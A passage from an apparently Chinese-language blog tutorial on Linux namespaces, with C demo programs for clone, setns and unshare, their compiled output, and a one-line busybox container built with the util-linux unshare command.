&lt;span class="cp">#define STACK_SIZE (1024 * 1024) &lt;/span>&lt;span class="cm">/* Stack size for cloned child */&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Start of stack buffer */&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">stackTop&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* End of stack buffer */&lt;/span>
&lt;span class="n">pid_t&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">struct&lt;/span> &lt;span class="n">utsname&lt;/span> &lt;span class="n">uts&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Usage: %s &amp;lt;child-hostname&amp;gt;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_SUCCESS&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cm">/* Allocate stack for child */&lt;/span>
&lt;span class="n">stack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STACK_SIZE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">stack&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;malloc&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">stackTop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">stack&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">STACK_SIZE&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Assume stack grows downward */&lt;/span>
&lt;span class="cm">/* Create child that has its own UTS namespace;
&lt;/span>&lt;span class="cm"> child commences execution in childFunc() */&lt;/span>
&lt;span class="n">pid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">clone&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">childFunc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stackTop&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CLONE_NEWUTS&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">SIGCHLD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;clone&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;clone() returned %ld&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">pid&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="cm">/* Parent falls through to here */&lt;/span>
&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="cm">/* Give child time to change its hostname */&lt;/span>
&lt;span class="cm">/* Display hostname in parent&amp;#39;s UTS namespace. This will be
&lt;/span>&lt;span class="cm"> different from hostname in child&amp;#39;s UTS namespace. */&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uname&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">uts&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;uname&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;uts.nodename in parent: %s&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">uts&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">nodename&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">waitpid&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="cm">/* Wait for child */&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;waitpid&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;child has terminated&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_SUCCESS&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>把上面的代码保存到 &lt;code>main.c&lt;/code> 之后，使用命令 &lt;code>gcc main.c -o clone-demo&lt;/code> 编译。&lt;/p>
&lt;p>编译完成后，&lt;code>sudo ./clone-demo new-hostname&lt;/code> 执行。&lt;/p>
&lt;p>最终结果类似这样&lt;/p>
&lt;pre>&lt;code>DESKTOP-HEKKTQ9 :: ~/repos/container » sudo ./clone-demo new-hostname
clone() returned 1515
uts.nodename in child: new-hostname
uts.nodename in parent: DESKTOP-HEKKTQ9
child has terminated
DESKTOP-HEKKTQ9 :: ~/repos/container »
&lt;/code>&lt;/pre>&lt;h3 id="setns">setns&lt;/h3>
&lt;p>&lt;code>setns&lt;/code> 把调用这个函数的线程加入指定 fd 的命名空间里。这个 &lt;code>fd&lt;/code> 指的是 &lt;code>/proc/1234/ns/uts&lt;/code> 这些特殊文件的文件描述符。&lt;/p>
&lt;p>举例来说，我们把 &lt;code>clone-demo&lt;/code> 的源码里，&lt;code>sleep(3)&lt;/code> 改为 &lt;code>sleep(200)&lt;/code>，再执行&lt;code>sudo clone-demo new-hostname &amp;amp;&lt;/code> 把进程放到后台。&lt;/p>
&lt;p>然后编译下面的代码并测试加入 clone-demo 的 uts 名称空间。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#define _GNU_SOURCE
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sched.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cp">#define errExit(msg) \
&lt;/span>&lt;span class="cp"> do \
&lt;/span>&lt;span class="cp"> { \
&lt;/span>&lt;span class="cp"> perror(msg); \
&lt;/span>&lt;span class="cp"> exit(EXIT_FAILURE); \
&lt;/span>&lt;span class="cp"> } while (0)
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%s /proc/PID/ns/FILE cmd args...&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">O_RDONLY&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="cm">/* Get file descriptor for namespace */&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;open&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">setns&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="cm">/* Join that namespace */&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;setns&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">execvp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]);&lt;/span> &lt;span class="cm">/* Execute a command in namespace */&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;execvp&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最终结果如下&lt;/p>
&lt;pre>&lt;code>root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container# ./clone-demo new-hostname &amp;amp;
[1] 1826
clone() returned 1827
uts.nodename in child: new-hostname
uts.nodename in parent: DESKTOP-HEKKTQ9
root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container# ./setns-demo /proc/1827/ns/uts /bin/bash
root@new-hostname:/home/weakptr/repos/container# uname -n
new-hostname
root@new-hostname:/home/weakptr/repos/container# exit
root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container# exit
DESKTOP-HEKKTQ9 :: ~/repos/container » uname -n
DESKTOP-HEKKTQ9
&lt;/code>&lt;/pre>&lt;h3 id="unshare">unshare&lt;/h3>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#define _GNU_SOURCE
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sched.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">unshare&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>&lt;code>unshare&lt;/code> 用于主动解除当前进程或线程从父进程继承的执行上下文（例如命名空间）。&lt;/p>
&lt;p>&lt;code>unshare&lt;/code>的主要用途就是在不创建新的进程的前提下，控制自己的共享执行上下文（还是指命名空间）。&lt;/p>
&lt;p>参数 &lt;code>flags&lt;/code> 依然是 &lt;code>CLONE_NEWNS&lt;/code> 这些常量。惯例还是有个 demo 。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cm">/* unshare.c
&lt;/span>&lt;span class="cm">
&lt;/span>&lt;span class="cm"> A simple implementation of the unshare(1) command: unshare
&lt;/span>&lt;span class="cm"> namespaces and execute a command.
&lt;/span>&lt;span class="cm">*/&lt;/span>
&lt;span class="cp">#define _GNU_SOURCE
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sched.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;wait.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cm">/* A simple error-handling function: print an error message based
&lt;/span>&lt;span class="cm"> on the value in &amp;#39;errno&amp;#39; and terminate the calling process */&lt;/span>
&lt;span class="cp">#define errExit(msg) \
&lt;/span>&lt;span class="cp"> do \
&lt;/span>&lt;span class="cp"> { \
&lt;/span>&lt;span class="cp"> perror(msg); \
&lt;/span>&lt;span class="cp"> exit(EXIT_FAILURE); \
&lt;/span>&lt;span class="cp"> } while (0)
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">static&lt;/span> &lt;span class="kt">void&lt;/span>
&lt;span class="nf">usage&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pname&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Usage: %s [options] program [arg...]&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pname&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Options can be:&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34; -i unshare IPC namespace&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34; -m unshare mount namespace&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34; -n unshare network namespace&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34; -p unshare PID namespace&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34; -u unshare UTS namespace&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34; -U unshare user namespace&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">opt&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">flags&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">opt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getopt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;imnpuU&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">opt&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="sc">&amp;#39;i&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">flags&lt;/span> &lt;span class="o">|=&lt;/span> &lt;span class="n">CLONE_NEWIPC&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="sc">&amp;#39;m&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">flags&lt;/span> &lt;span class="o">|=&lt;/span> &lt;span class="n">CLONE_NEWNS&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="sc">&amp;#39;n&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">flags&lt;/span> &lt;span class="o">|=&lt;/span> &lt;span class="n">CLONE_NEWNET&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="sc">&amp;#39;p&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">flags&lt;/span> &lt;span class="o">|=&lt;/span> &lt;span class="n">CLONE_NEWPID&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="sc">&amp;#39;u&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">flags&lt;/span> &lt;span class="o">|=&lt;/span> &lt;span class="n">CLONE_NEWUTS&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="sc">&amp;#39;U&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">flags&lt;/span> &lt;span class="o">|=&lt;/span> &lt;span class="n">CLONE_NEWUSER&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="n">usage&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">optind&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">usage&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">unshare&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flags&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;unshare&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">pid_t&lt;/span> &lt;span class="n">pid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fork&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;child process&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">execvp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">optind&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">optind&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="n">errExit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;execvp&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;waitpid %ld&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">waitpid&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>保存成 &lt;code>unshare.c&lt;/code>，使用&lt;code>gcc unshare.c -o unshare&lt;/code> 编译。&lt;/p>
&lt;p>之后可以通过下面的命令来检查效果。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sudo ./unshare -pm /bin/bash &lt;span class="c1"># 隔离 mount 和 pid 两个 namespace&lt;/span>
waitpid &lt;span class="m">2178&lt;/span>
root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container# mount -t proc proc /proc
root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container# ps -ef
UID PID PPID C STIME TTY TIME CMD
root &lt;span class="m">1&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> 15:22 pts/0 00:00:00 /bin/bash
root &lt;span class="m">3&lt;/span> &lt;span class="m">1&lt;/span> &lt;span class="m">0&lt;/span> 15:22 pts/0 00:00:00 ps -ef
root@DESKTOP-HEKKTQ9:/home/weakptr/repos/container#
&lt;/code>&lt;/pre>&lt;/div>&lt;p>需要注意几个点：&lt;/p>
&lt;ol>
&lt;li>&lt;code>unshare&lt;/code> 最后必须是 &lt;code>fork&lt;/code> 新进程再 &lt;code>execvp&lt;/code>，否则会出现 &lt;code>cannot allocate memory&lt;/code> 错误&lt;/li>
&lt;li>&lt;code>unshare&lt;/code> 启动新的 &lt;code>/bin/bash&lt;/code> 进程后，&lt;code>/proc&lt;/code> 挂载点还没有真正隔离，此时可以手动使用 &lt;code>mount -t proc proc /proc&lt;/code> 命令挂载当前命名空间的 &lt;code>procfs&lt;/code>。&lt;/li>
&lt;li>mount namespace 中挂载事件传播，可以查看文档 &lt;code>man 7 mount_namespaces&lt;/code>。&lt;/li>
&lt;/ol>
&lt;p>debian 系的 Linux 发行版在 util-linux 包里提供了一个 &lt;code>unshare&lt;/code> 程序，比上面的 demo 更强大，甚至可以用一行命令实现一个基本的&lt;em>容器&lt;/em>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># 我在 workspace 目录里装了 busybox，所以能直接跑起来 chroot 和 /bin/ash&lt;/span>
&lt;span class="c1"># busybox 的安装方法参考 busybox 源码目录下的 INSTALL 文件&lt;/span>
&lt;span class="c1"># vim Config.in 修改 config STATIC 下的 default 为 y&lt;/span>
&lt;span class="c1"># make defconfig &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install CONFIG_PREFIX=你的workspace目录&lt;/span>
sudo unshare -pumf --mount-proc&lt;span class="o">=&lt;/span>workspace/proc chroot workspace /bin/ash
